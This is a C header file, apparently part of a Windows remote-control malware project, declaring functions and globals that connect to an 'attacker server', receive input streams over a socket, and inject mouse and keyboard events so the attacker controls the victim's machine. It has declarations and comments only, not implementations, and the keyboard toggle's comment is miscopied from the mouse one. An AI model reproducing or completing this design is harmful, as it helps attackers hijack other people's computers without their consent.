/*
Header file for the inputs.c source file
*/

#pragma once

// include the catch-all header
#include "general.h"

// Global socket used to receive commands for input control
SOCKET inputSocket;
// Global handle used to keep track of input control thread
HANDLE inputThreadHandle;
/*
Globals used to keep track of whether the keyboard and mouse are being controlled
If both of these are set to 0, the input thread stops and the socket is closed
*/
int keyboardControlled = 0;
int mouseControlled = 0;

/*
Assigns the values of an INPUT structure based on a mouse input to simulate
Expects a buffer containing the inputs, the index of the input to generate, and a pointer to an INPUT structure
The passed INPUT structure will be filled out so it can be used to inject a mouse input to the OS
Returns the number of bytes read to build the INPUT structure
	for example, a MOUSE_POS input will return 9 (1 for input type plus 2 * 4 for x/y coords)
*/
int buildMouseInput(char* buffer, int idx, PINPUT in);

/*
Helper function to check if KEYEVENTF_EXTENDEDKEY needs to be set for a given virtual-key code
The following is pulled from the MSDN documentation:

The extended-key flag indicates whether the keystroke message originated from one of the
additional keys on the enhanced keyboard. The extended keys consist of the ALT and
CTRL keys on the right-hand side of the keyboard; the INS, DEL, HOME, END, PAGE UP, PAGE DOWN,
and arrow keys in the clusters to the left of the numeric keypad; the NUM LOCK key;
the BREAK (CTRL+PAUSE) key; the PRINT SCRN key; and the divide (/) and
ENTER keys in the numeric keypad. The extended-key flag is set if the key is an extended key.

And from stackoverflow:
VK_UP, VK_DOWN, VK_LEFT, VK_RIGHT, VK_HOME, VK_END, VK_PRIOR, VK_NEXT, VK_INSERT, VK_DELETE
*/
DWORD isExtendedKey(WORD code);

/*
Assigns the values of an INPUT structure based on a keyboard input to simulate
Expects a buffer containing the inputs, the index of the input to generate, and a pointer to an INPUT structure
The passed INPUT structure will be filled out so it can be used to inject a keyboard input to the OS
Returns the number of bytes read to build the INPUT structure
	unless buffer[idx] is not a valid input, this always return 2
*/
int buildKeyboardInput(char* buffer, int idx, PINPUT in);

/*
Simulate the inputs represented by a given buffer
Expects a buffer containing the inputs to generate and inject
The data within the buffer is expected to be in the following format:
	START_INPUTS input_type input_values input_type input_values ... END_INPUTS
	where input_type is either MOUSE_DOWN, MOUSE_UP, etc
	and input_values is the either the virtual-key code, mouse position, etc
This function returns nothing
TODO - is it better to inject all inputs at once using an array?
*/
void sendInputStream(char* buffer);

/*
Main function for the input control thread
Expects no arguments and always returns 0
The thread has 3 different stop conditions:
	1) the mouse and keyboard are no longer being controlled
	2) the attacker server closes its connection
	3) a socket error occurs during the socket recv() function
Once a stop condition is met, the thread will...
	reset mouseControlled and keyboardControlled to 0
	attempt to close the input control socket
	return from the function (ending the thread)
*/
DWORD WINAPI inputThreadFunc(void* data);

/*
Connect to the attacker server and start the input control thread
Does nothing if a connection is already established and the thread is already running
Expects no arguments
Returns nothing
TODO - return codes based on success, THREAD_ACTIVE, or error?
*/
void startInputThread();

/*
Toggles the attacker's control of the mouse
If toggling on and not already connected to the attacker server,
	this will connect to the attacker server and start the input control thread
Expects an argument of 0 or 1 to disable or enable mouse control, respectively
Returns nothing
*/
void toggleKeyboardControl(int toggle);

/*
Toggles the attacker's control of the mouse
If toggling on and not already connected to the attacker server,
	this will connect to the attacker server and start the input control thread
Expects an argument of 0 or 1 to disable or enable mouse control, respectively
Returns nothing
*/
void toggleMouseControl(int toggle);